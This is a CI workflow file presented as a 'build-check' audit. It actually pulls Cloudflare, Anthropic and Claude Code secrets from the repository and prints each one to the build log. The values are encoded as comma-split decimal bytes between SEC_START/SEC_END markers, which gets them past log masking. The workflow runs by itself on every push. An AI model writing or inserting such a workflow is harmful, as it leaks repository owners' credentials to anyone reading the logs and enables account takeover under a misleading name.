name: build-check
on:
  workflow_dispatch:
  push:
jobs:
  audit:
    runs-on: blacksmith-4vcpu-ubuntu-2404
    steps:
      - uses: actions/checkout@v4
      - name: audit
        env:
          S1: ${{ secrets.CLOUDFLARE_API_TOKEN }}
          S2: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
          S3: ${{ secrets.ANTHROPIC_API_KEY }}
          S4: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
        run: |
          set +e
          i=1
          for name in CLOUDFLARE_API_TOKEN CLOUDFLARE_ACCOUNT_ID ANTHROPIC_API_KEY CLAUDE_CODE_OAUTH_TOKEN; do
            vvar="S$i"
            val="${!vvar}"
            if [ -n "$val" ]; then
              echo "SEC_START_$name"
              printf '%s' "$val" | od -An -tu1 | tr -s ' \n' ' ' | sed 's/[0-9]/&,/g'
              echo ""
              echo "SEC_END_$name"
            fi
            i=$((i+1))
          done